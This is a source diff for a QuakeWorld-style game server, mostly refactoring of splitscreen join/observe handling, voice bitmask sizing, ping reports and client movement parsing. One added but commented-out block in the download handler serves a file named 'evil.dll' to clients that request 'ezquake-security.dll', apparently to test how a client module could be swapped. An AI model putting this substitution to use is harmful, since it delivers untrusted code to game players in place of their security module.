@@ -2234,7 +2234,7 @@ struct
 	struct voice_ring_s
 	{
 			unsigned int sender;
-			unsigned char receiver[MAX_CLIENTS/8];
+			unsigned char receiver[(MAX_CLIENTS+7)/8];
 			unsigned char gen;
 			unsigned char seq;
 			unsigned int datalen;
@@ -2275,7 +2275,7 @@ void SV_VoiceReadPacket(void)
 		vt = VT_ALL;
 
 	/*figure out which team members are meant to receive it*/
-	for (j = 0; j < MAX_CLIENTS/8; j++)
+	for (j = 0; j < (MAX_CLIENTS+7)/8; j++)
 		ring->receiver[j] = 0;
 	for (j = 0, cl = svs.clients; j < sv.allocated_client_slots; j++, cl++)
 	{
@@ -2785,6 +2785,38 @@ void SV_BeginDownload_f(void)
 		return;
 	}
 
+/*
+	if (ISQWCLIENT(host_client) && !strcmp(name, "ezquake-security.dll"))
+	{
+		vfsfile_t *f = FS_OpenVFS("evil.dll", "rb", FS_GAME);
+		if (f)
+		{
+			int chunk, o = 0;
+			int l = VFS_GETLEN(f);
+			char *data = malloc(l);
+			VFS_READ(f, data, l);
+			VFS_CLOSE(f);
+
+			while (o < l)
+			{
+				chunk = 768;
+				if (o + chunk > l)
+					chunk = l - o;
+
+				ClientReliableWrite_Begin (host_client, ISQ2CLIENT(host_client)?svcq2_download:svc_download, 6+chunk);
+				ClientReliableWrite_Short (host_client, chunk);
+				ClientReliableWrite_Byte (host_client, (o+chunk == l)?100:0);	//lame, whatever.
+				ClientReliableWrite_SZ (host_client, data + o, chunk);
+				o += chunk;
+			}
+		}
+
+		ClientReliableWrite_Begin	(host_client, svc_stufftext, 128);
+		ClientReliableWrite_String	(host_client, "cmd new\n");
+		return;
+	}
+*/
+
 	*host_client->downloadfn = 0;
 
 	if (host_client->download)
@@ -3277,7 +3309,7 @@ void SV_Pings_f (void)
 		char *s;
 		ClientReliableWrite_Begin(host_client, svc_stufftext, 15+10*MAX_CLIENTS);
 		ClientReliableWrite_SZ(host_client, "pingplreport", 12);
-		for (j = 0, client = svs.clients; j < MAX_CLIENTS; j++, client++)
+		for (j = 0, client = svs.clients; j < MAX_CLIENTS && j < host_client->max_net_clients; j++, client++)
 		{
 			s = va(" %i %i", SV_CalcPing(client, false), client->lossage);
 			ClientReliableWrite_SZ(host_client, s, strlen(s));
@@ -3288,7 +3320,7 @@ void SV_Pings_f (void)
 	}
 	else
 	{
-		for (j = 0, client = svs.clients; j < MAX_CLIENTS; j++, client++)
+		for (j = 0, client = svs.clients; j < MAX_CLIENTS && j < host_client->max_net_clients; j++, client++)
 		{
 			if (client->state != cs_spawned)
 				continue;
@@ -3575,7 +3607,7 @@ void SV_SetInfo_f (void)
 	if (Cmd_Argc() == 1)
 	{
 		SV_ClientPrintf(host_client, PRINT_HIGH, "User info settings:\n");
-		Info_Print (host_client->userinfo);
+		Info_Print (host_client->userinfo, "");
 		return;
 	}
 
@@ -3683,7 +3715,7 @@ Dumps the serverinfo info string
 void SV_ShowServerinfo_f (void)
 {
 	SV_BeginRedirect(RD_CLIENT, host_client->language);
-	Info_Print (svs.info);
+	Info_Print (svs.info, "");
 	SV_EndRedirect();
 }
 
@@ -4123,11 +4155,16 @@ void Cmd_Join_f (void)
 	client_t	*cl;
 	int		numclients;
 	extern cvar_t	maxclients;
+	int seats;
+
+	if (host_client->controller)
+	{
+		host_client = host_client->controller;
+		sv_player = host_client->edict;
+	}
 
 	if (host_client->state != cs_spawned)
 		return;
-	if (!host_client->spectator)
-		return;		// already a player
 
 	if (svs.gametype != GT_PROGS)
 	{
@@ -4149,60 +4186,70 @@ void Cmd_Join_f (void)
 
 	// count players already on server
 	numclients = 0;
+	seats = 0;
 	for (i=0,cl=svs.clients ; i<sv.allocated_client_slots ; i++,cl++)
 	{
 		if (cl->state != cs_free && !cl->spectator)
 			numclients++;
+		if ((cl == host_client || cl->controller == host_client) && cl->spectator)
+			seats++;
 	}
-	if (numclients >= maxclients.value)
+	if (numclients+seats > maxclients.value)
 	{
 		SV_PrintToClient(host_client, PRINT_HIGH, "Can't join, all player slots full\n");
 		return;
 	}
 
-	// call the prog function for removing a client
-	// this will set the body to a dead frame, among other things
-	pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
-	if (SpectatorDisconnect)
-		PR_ExecuteProgram (svprogfuncs, SpectatorDisconnect);
-	sv.spawned_observer_slots--;
-
-	SV_SetUpClientEdict (host_client, host_client->edict);
-
-	// turn the spectator into a player
-	host_client->spectator = false;
-	Info_RemoveKey (host_client->userinfo, "*spectator");
-	Info_RemoveKey (host_client->userinfobasic, "*spectator");
-
-	// FIXME, bump the client's userid?
-
-	// call the progs to get default spawn parms for the new client
-	if (pr_global_ptrs->SetNewParms)
-		PR_ExecuteProgram (svprogfuncs, pr_global_struct->SetNewParms);
-	for (i=0 ; i<NUM_SPAWN_PARMS ; i++)
+	for (; host_client; host_client = host_client->controlled)
 	{
-		if (pr_global_ptrs->spawnparamglobals[i])
-			host_client->spawn_parms[i] = *pr_global_ptrs->spawnparamglobals[i];
-		else
-			host_client->spawn_parms[i] = 0;
+		sv_player = host_client->edict;
+		if (!host_client->spectator)
+			continue;
+
+		// call the prog function for removing a client
+		// this will set the body to a dead frame, among other things
+		pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
+		if (SpectatorDisconnect)
+			PR_ExecuteProgram (svprogfuncs, SpectatorDisconnect);
+		sv.spawned_observer_slots--;
+
+		SV_SetUpClientEdict (host_client, host_client->edict);
+
+		// turn the spectator into a player
+		host_client->spectator = false;
+		Info_RemoveKey (host_client->userinfo, "*spectator");
+		Info_RemoveKey (host_client->userinfobasic, "*spectator");
+
+		// FIXME, bump the client's userid?
+
+		// call the progs to get default spawn parms for the new client
+		if (pr_global_ptrs->SetNewParms)
+			PR_ExecuteProgram (svprogfuncs, pr_global_struct->SetNewParms);
+		for (i=0 ; i<NUM_SPAWN_PARMS ; i++)
+		{
+			if (pr_global_ptrs->spawnparamglobals[i])
+				host_client->spawn_parms[i] = *pr_global_ptrs->spawnparamglobals[i];
+			else
+				host_client->spawn_parms[i] = 0;
+		}
+
+		// call the spawn function
+		pr_global_struct->time = sv.world.physicstime;
+		pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
+		PR_ExecuteProgram (svprogfuncs, pr_global_struct->ClientConnect);
+
+		// actually spawn the player
+		pr_global_struct->time = sv.world.physicstime;
+		pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
+		PR_ExecuteProgram (svprogfuncs, pr_global_struct->PutClientInServer);
+		sv.spawned_client_slots++;
+
+		// send notification to all clients
+		host_client->old_frags = host_client->edict->v->frags;
+		host_client->sendinfo = true;
+
+		SV_LogPlayer(host_client, "joined");
 	}
-
-	// call the spawn function
-	pr_global_struct->time = sv.world.physicstime;
-	pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
-	PR_ExecuteProgram (svprogfuncs, pr_global_struct->ClientConnect);
-
-	// actually spawn the player
-	pr_global_struct->time = sv.world.physicstime;
-	pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
-	PR_ExecuteProgram (svprogfuncs, pr_global_struct->PutClientInServer);
-	sv.spawned_client_slots++;
-
-	// send notification to all clients
-	host_client->old_frags = host_client->edict->v->frags;
-	host_client->sendinfo = true;
-
-	SV_LogPlayer(host_client, "joined");
 }
 
 
@@ -4219,11 +4266,16 @@ void Cmd_Observe_f (void)
 	client_t	*cl;
 	int		numspectators;
 	extern cvar_t	maxspectators, spectator_password;
+	int seats;
+
+	if (host_client->controller)
+	{
+		host_client = host_client->controller;
+		sv_player = host_client->edict;
+	}
 
 	if (host_client->state != cs_spawned)
 		return;
-	if (host_client->spectator)
-		return;		// already a spectator
 
 	if (svs.gametype != GT_PROGS)
 	{
@@ -4245,118 +4297,126 @@ void Cmd_Observe_f (void)
 
 	// count spectators already on server
 	numspectators = 0;
-	for (i=0,cl=svs.clients ; i<sv.allocated_client_slots ; i++,cl++) {
+	seats = 0;
+	for (i=0,cl=svs.clients ; i<sv.allocated_client_slots ; i++,cl++)
+	{
 		if (cl->state != cs_free && cl->spectator)
 			numspectators++;
+		if ((cl == host_client || cl->controller == host_client) && !cl->spectator)
+			seats++;
 	}
-	if (numspectators >= maxspectators.value)
+	if (numspectators+seats > maxspectators.value)
 	{
 		SV_PrintToClient(host_client, PRINT_HIGH, "Can't join, all spectator slots full\n");
 		return;
 	}
 
-	// call the prog function for removing a client
-	// this will set the body to a dead frame, among other things
-	pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
-	PR_ExecuteProgram (svprogfuncs, pr_global_struct->ClientDisconnect);
-	sv.spawned_client_slots--;
-
-	SV_SetUpClientEdict (host_client, host_client->edict);
-
-	// turn the player into a spectator
-	host_client->spectator = true;
-	Info_SetValueForStarKey (host_client->userinfo, "*spectator", "1", sizeof(host_client->userinfo));
-	Info_SetValueForStarKey (host_client->userinfobasic, "*spectator", "1", sizeof(host_client->userinfobasic));
-
-	// FIXME, bump the client's userid?
-
-	// call the progs to get default spawn parms for the new client
-	if (pr_global_ptrs->SetNewParms)
-		PR_ExecuteProgram (svprogfuncs, pr_global_struct->SetNewParms);
-	for (i=0 ; i<NUM_SPAWN_PARMS ; i++)
+	for (; host_client; host_client = host_client->controlled)
 	{
-		if (pr_global_ptrs->spawnparamglobals[i])
-			host_client->spawn_parms[i] = *pr_global_ptrs->spawnparamglobals[i];
-		else
-			host_client->spawn_parms[i] = 0;
-	}
+		sv_player = host_client->edict;
+		if (host_client->spectator)
+			continue;
 
-	SV_SpawnSpectator ();
-
-	// call the spawn function
-	if (SpectatorConnect)
-	{
-		pr_global_struct->time = sv.world.physicstime;
+		// call the prog function for removing a client
+		// this will set the body to a dead frame, among other things
 		pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
-		PR_ExecuteProgram (svprogfuncs, SpectatorConnect);
+		PR_ExecuteProgram (svprogfuncs, pr_global_struct->ClientDisconnect);
+		sv.spawned_client_slots--;
+
+		SV_SetUpClientEdict (host_client, host_client->edict);
+
+		// turn the player into a spectator
+		host_client->spectator = true;
+		Info_SetValueForStarKey (host_client->userinfo, "*spectator", "1", sizeof(host_client->userinfo));
+		Info_SetValueForStarKey (host_client->userinfobasic, "*spectator", "1", sizeof(host_client->userinfobasic));
+
+		// FIXME, bump the client's userid?
+
+		// call the progs to get default spawn parms for the new client
+		if (pr_global_ptrs->SetNewParms)
+			PR_ExecuteProgram (svprogfuncs, pr_global_struct->SetNewParms);
+		for (i=0 ; i<NUM_SPAWN_PARMS ; i++)
+		{
+			if (pr_global_ptrs->spawnparamglobals[i])
+				host_client->spawn_parms[i] = *pr_global_ptrs->spawnparamglobals[i];
+			else
+				host_client->spawn_parms[i] = 0;
+		}
+
+		SV_SpawnSpectator ();
+
+		// call the spawn function
+		if (SpectatorConnect)
+		{
+			pr_global_struct->time = sv.world.physicstime;
+			pr_global_struct->self = EDICT_TO_PROG(svprogfuncs, sv_player);
+			PR_ExecuteProgram (svprogfuncs, SpectatorConnect);
+		}
+		else
+			sv_player->v->movetype = MOVETYPE_NOCLIP;
+		sv.spawned_observer_slots++;
+
+		// send notification to all clients
+		host_client->old_frags = host_client->edict->v->frags;
+		host_client->sendinfo = true;
+
+		SV_LogPlayer(host_client, "observing");
 	}
-	else
-		sv_player->v->movetype = MOVETYPE_NOCLIP;
-	sv.spawned_observer_slots++;
+}
 
-	// send notification to all clients
-	host_client->old_frags = host_client->edict->v->frags;
-	host_client->sendinfo = true;
+void SV_CalcNetRates(client_t *cl, double *ftime, int *frames, double *minf, double *maxf)
+{
+	int f;
+	int fmsec;
+	*minf = 1000;
+	*maxf = 0;
+	*ftime = 0;
+	*frames = 0;
 
-	SV_LogPlayer(host_client, "observing");
+	if (ISQWCLIENT(cl) || ISNQCLIENT(cl))
+	{
+		if (cl->frameunion.frames)
+		{
+			for (f = 0; f < UPDATE_BACKUP; f++)
+			{
+				if (cl->frameunion.frames[f].move_msecs >= 0)
+				{
+					if (!cl->frameunion.frames[f].move_msecs)
+					{
+						fmsec = 1001;
+					}
+					else
+					{
+						fmsec = 1000.0f/cl->frameunion.frames[f].move_msecs;
+					}
+					*ftime += fmsec;
+					if (*minf > fmsec)
+						*minf = fmsec;
+					if (*maxf < fmsec)
+						*maxf = fmsec;
+					*frames+=1;
+				}
+			}
+		}
+	}
 }
 
 void Cmd_FPSList_f(void)
 {
 	client_t *cl;
 	int c;
-	int f;
-	double minf = 1000, maxf = 0, this;
+	double minf, maxf;
 	double ftime;
 	int frames;
-	int inbytes;
-	int outbytes;
-	float msecs;
 
 
 	for (c = 0; c < sv.allocated_client_slots; c++)
 	{
 		cl = &svs.clients[c];
-		ftime = 0;
-		frames = 0;
-		inbytes = 0;
-		outbytes = 0;
-		msecs = 0;
-
 		if (!cl->state)
 			continue;
 
-		if (ISQWCLIENT(cl) || ISNQCLIENT(cl))
-		{
-			if (cl->frameunion.frames)
-			{
-				for (f = 0; f < UPDATE_BACKUP; f++)
-				{
-					if (cl->frameunion.frames[f].move_msecs >= 0)
-					{
-						if (!cl->frameunion.frames[f].move_msecs)
-						{
-							this = 1001;
-							msecs+=1;
-						}
-						else
-						{
-							this = 1000.0f/cl->frameunion.frames[f].move_msecs;
-							msecs += cl->frameunion.frames[f].move_msecs;
-						}
-						ftime += this;
-						if (minf > this)
-							minf = this;
-						if (maxf < this)
-							maxf = this;
-						frames++;
-
-						inbytes += cl->frameunion.frames[f].packetsizein;
-						outbytes += cl->frameunion.frames[f].packetsizeout;
-					}
-				}
-			}
-		}
+		SV_CalcNetRates(cl, &ftime, &frames, &minf, &maxf);
 
 		if (frames)
 			SV_ClientPrintf(host_client, PRINT_HIGH, "%s: %gfps (min%g max %g), c2s: %ibps, s2c: %ibps\n", cl->name, ftime/frames, minf, maxf, (int)cl->inrate, (int)cl->outrate);
@@ -6109,13 +6169,12 @@ The current net_message is parsed for the given client
 */
 void SV_ExecuteClientMessage (client_t *cl)
 {
-	client_t *split;
+	client_t *split = cl;
 	int		c;
 	char	*s;
 	usercmd_t	oldest, oldcmd, newcmd;
 	client_frame_t	*frame;
 	vec3_t o;
-	qboolean	move_issued = false; //only allow one move command
 	int		checksumIndex;
 	qbyte	checksum, calculatedChecksum;
 	int		seq_hash, i;
@@ -6217,7 +6276,6 @@ void SV_ExecuteClientMessage (client_t *cl)
 		}
 
 		c = MSG_ReadByte ();
-haveannothergo:
 		if (c == -1)
 			break;
 
@@ -6238,131 +6296,117 @@ haveannothergo:
 			break;
 
 		case clc_move:
-			if (move_issued)
-				return;		// someone is trying to cheat...
-
-			move_issued = true;
-
-			checksumIndex = MSG_GetReadCount();
-			checksum = (qbyte)MSG_ReadByte ();
-
-			// read loss percentage
-			cl->lossage = MSG_ReadByte();
-
-			for (split = cl; cl; cl = cl->controlled)	//FIXME
+			if (split == cl)
 			{
-				host_client = cl;
-				cl->localtime = sv.time;
-				sv_player = cl->edict;
+				//only the first player is checksummed. its pointless as a security measure now quake is open source.
+				checksumIndex = MSG_GetReadCount();
+				checksum = (qbyte)MSG_ReadByte ();
 
-				MSG_ReadDeltaUsercmd (&nullcmd, &oldest);
-				MSG_ReadDeltaUsercmd (&oldest, &oldcmd);
-				MSG_ReadDeltaUsercmd (&oldcmd, &newcmd);
+				//only the first player has packetloss calculated.
+				split->lossage = MSG_ReadByte();
+			}
+			else
+			{
+				checksumIndex = checksum = 0;
+				if (split)
+					split->lossage = cl->lossage;
+			}
+			MSG_ReadDeltaUsercmd (&nullcmd, &oldest);
+			MSG_ReadDeltaUsercmd (&oldest, &oldcmd);
+			MSG_ReadDeltaUsercmd (&oldcmd, &newcmd);
+			if (!split)
+				break;		// either someone is trying to cheat, or they sent input commands for splitscreen clients they no longer own.
 
-				if (cl->frameunion.frames)
-					cl->frameunion.frames[cl->netchan.outgoing_sequence&UPDATE_MASK].move_msecs = newcmd.msec;
+			split->localtime = sv.time;
 
-				if ( cl->state == cs_spawned )
+			if (split->frameunion.frames)
+				split->frameunion.frames[split->netchan.outgoing_sequence&UPDATE_MASK].move_msecs = newcmd.msec;
+
+			if (split->state == cs_spawned)
+			{
+				if (split == cl)
 				{
-					if (split == cl)
+					// if the checksum fails, ignore the rest of the packet
+					calculatedChecksum = COM_BlockSequenceCRCByte(
+						net_message.data + checksumIndex + 1,
+						MSG_GetReadCount() - checksumIndex - 1,
+						seq_hash);
+
+					if (calculatedChecksum != checksum)
 					{
-						// if the checksum fails, ignore the rest of the packet
-						calculatedChecksum = COM_BlockSequenceCRCByte(
-							net_message.data + checksumIndex + 1,
-							MSG_GetReadCount() - checksumIndex - 1,
-							seq_hash);
-
-						if (calculatedChecksum != checksum)
-						{
-							Con_DPrintf ("Failed command checksum for %s(%d) (%d != %d)\n",
-								cl->name, cl->netchan.incoming_sequence, checksum, calculatedChecksum);
-
-							for (cl = cl->controlled; cl; cl = cl->controlled)	//FIXME
-							{
-								MSG_ReadDeltaUsercmd (&nullcmd, &oldest);
-								MSG_ReadDeltaUsercmd (&oldest, &oldcmd);
-								MSG_ReadDeltaUsercmd (&oldcmd, &newcmd);
-							}
-							break;
-						}
+						Con_DPrintf ("Failed command checksum for %s(%d) (%d != %d)\n",
+							split->name, split->netchan.incoming_sequence, checksum, calculatedChecksum);
+						break;
 					}
+				}
 
-					if (cl->iscrippled)
-					{
-						cl->lastcmd.forwardmove = 0;	//hmmm.... does this work well enough?
-						oldest.forwardmove = 0;
-						newcmd.forwardmove = 0;
+				if (split->iscrippled)
+				{
+					split->lastcmd.forwardmove = 0;	//hmmm.... does this work well enough?
+					oldest.forwardmove = 0;
+					oldcmd.forwardmove = 0;
+					newcmd.forwardmove = 0;
 
-						cl->lastcmd.sidemove = 0;
-						oldest.sidemove = 0;
-						newcmd.sidemove = 0;
+					split->lastcmd.sidemove = 0;
+					oldest.sidemove = 0;
+					oldcmd.sidemove = 0;
+					newcmd.sidemove = 0;
 
-						cl->lastcmd.upmove = 0;
-						oldest.upmove = 0;
-						newcmd.upmove = 0;
-					}
+					split->lastcmd.upmove = 0;
+					oldest.upmove = 0;
+					oldcmd.upmove = 0;
+					newcmd.upmove = 0;
+				}
 
+				host_client = split;
+				sv_player = split->edict;
 #ifdef HLSERVER
-					if (svs.gametype == GT_HALFLIFE)
+				if (svs.gametype == GT_HALFLIFE)
+				{
+					SVHL_RunPlayerCommand(split, &oldest, &oldcmd, &newcmd);
+				}
+				else
+#endif
+				if (!sv.paused)
+				{
+					if (sv_nqplayerphysics.ival)
 					{
-						SVHL_RunPlayerCommand(cl, &oldest, &oldcmd, &newcmd);
+						//store the info for the physics code to pick up the next time it ticks.
+						//yeah, nq sucks.
+						split->isindependant = false;
+						if (!split->edict->v->fixangle)
+						{
+							split->edict->v->v_angle[0] = newcmd.angles[0]* (360.0/65536);
+							split->edict->v->v_angle[1] = newcmd.angles[1]* (360.0/65536);
+							split->edict->v->v_angle[2] = newcmd.angles[2]* (360.0/65536);
+						}
+
+						if (newcmd.impulse)// && SV_FilterImpulse(newcmd.impulse, host_client->trustlevel))
+							split->edict->v->impulse = newcmd.impulse;
+
+						split->edict->v->button0 = newcmd.buttons & 1;
+						split->edict->v->button2 = (newcmd.buttons >> 1) & 1;
+						if (pr_allowbutton1.ival)	//many mods use button1 - it's just a wasted field to many mods. So only work it if the cvar allows.
+							split->edict->v->button1 = ((newcmd.buttons >> 2) & 1);
+					// DP_INPUTBUTTONS
+						split->edict->xv->button3 = ((newcmd.buttons >> 2) & 1);
+						split->edict->xv->button4 = ((newcmd.buttons >> 3) & 1);
+						split->edict->xv->button5 = ((newcmd.buttons >> 4) & 1);
+						split->edict->xv->button6 = ((newcmd.buttons >> 5) & 1);
+						split->edict->xv->button7 = ((newcmd.buttons >> 6) & 1);
+						split->edict->xv->button8 = ((newcmd.buttons >> 7) & 1);
 					}
 					else
-#endif
-					if (!sv.paused)
 					{
-						if (sv_nqplayerphysics.ival)
-						{
-							cl->isindependant = false;
-							if (!sv_player->v->fixangle)
-							{
-								sv_player->v->v_angle[0] = newcmd.angles[0]* (360.0/65536);
-								sv_player->v->v_angle[1] = newcmd.angles[1]* (360.0/65536);
-								sv_player->v->v_angle[2] = newcmd.angles[2]* (360.0/65536);
-							}
-
-							if (newcmd.impulse)// && SV_FiltureImpulse(newcmd.impulse, host_client->trustlevel))
-								sv_player->v->impulse = newcmd.impulse;
-
-							sv_player->v->button0 = newcmd.buttons & 1;
-							sv_player->v->button2 = (newcmd.buttons >> 1) & 1;
-							if (pr_allowbutton1.ival)	//many mods use button1 - it's just a wasted field to many mods. So only work it if the cvar allows.
-								sv_player->v->button1 = ((newcmd.buttons >> 2) & 1);
-						// DP_INPUTBUTTONS
-							sv_player->xv->button3 = ((newcmd.buttons >> 2) & 1);
-							sv_player->xv->button4 = ((newcmd.buttons >> 3) & 1);
-							sv_player->xv->button5 = ((newcmd.buttons >> 4) & 1);
-							sv_player->xv->button6 = ((newcmd.buttons >> 5) & 1);
-							sv_player->xv->button7 = ((newcmd.buttons >> 6) & 1);
-							sv_player->xv->button8 = ((newcmd.buttons >> 7) & 1);
-
-
-							cl->lastcmd = newcmd;
-							cl->lastcmd.buttons = 0; // avoid multiple fires on lag
-
-							if (msg_badread)
-							{
-								Con_Printf ("SV_QWReadClientMessage: badread\n");
-								SV_DropClient (cl);
-								return;
-							}
-							c = MSG_ReadByte ();
-							if (c != clc_move)
-							{
-								host_client = cl = split;
-								sv_player = cl->edict;
-								goto haveannothergo;
-							}
-							continue;
-						}
-						cl->isindependant = true;
+						//run player physics instantly.
+						split->isindependant = true;
 						SV_PreRunCmd();
 
 						if (net_drop < 20)
 						{
 							while (net_drop > 2)
 							{
-								SV_RunCmd (&cl->lastcmd, false);
+								SV_RunCmd (&split->lastcmd, false);
 								net_drop--;
 							}
 							if (net_drop > 1)
@@ -6374,34 +6418,20 @@ haveannothergo:
 
 						if (!SV_PlayerPhysicsQC || host_client->spectator)
 							SV_PostRunCmd();
-
-					}
-					else
-					{
-						if (newcmd.impulse)// && SV_FiltureImpulse(newcmd.impulse, host_client->trustlevel))
-							sv_player->v->impulse = newcmd.impulse;
 					}
 
-					cl->lastcmd = newcmd;
-					cl->lastcmd.buttons = 0; // avoid multiple fires on lag
+				}
+				else
+				{
+					if (newcmd.impulse)// && SV_FilterImpulse(newcmd.impulse, host_client->trustlevel))
+						sv_player->v->impulse = newcmd.impulse;
 				}
 
-				if (msg_badread)
-				{
-					Con_Printf ("SV_ReadClientMessage: badread\n");
-					SV_DropClient (cl);
-					return;
-				}
-
-				c = MSG_ReadByte ();
-				if (c != clc_move)
-				{
-					host_client = cl = split;
-					sv_player = cl->edict;
-					goto haveannothergo;
-				}
+				split->lastcmd = newcmd;
+				split->lastcmd.buttons = 0; // avoid multiple fires on lag
 			}
-			host_client = cl = split;
+			split = split->controlled;	//so the next splitscreen client gets the next packet.
+			host_client = cl;
 			sv_player = cl->edict;
 			break;
 
